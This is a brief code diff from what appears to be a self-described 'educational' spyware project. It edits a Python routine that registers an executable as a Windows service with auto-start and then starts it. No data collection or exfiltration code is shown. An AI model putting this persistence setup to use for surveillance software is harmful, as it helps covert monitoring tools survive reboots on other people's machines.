@@ -16,7 +16,7 @@ def main():
 
     import os
     srv_name = 'My Service'
-    os.system(fr'sc create "{srv_name}" binPath="C:\Users\user\Desktop\Python\EducationalSpyware2\dist\service.exe"')
+    os.system(fr'sc create "{srv_name}" start=auto binPath="C:\Users\user\Desktop\Python\EducationalSpyware\service.exe"')
     os.system(f'sc start "{srv_name}"')
 
 
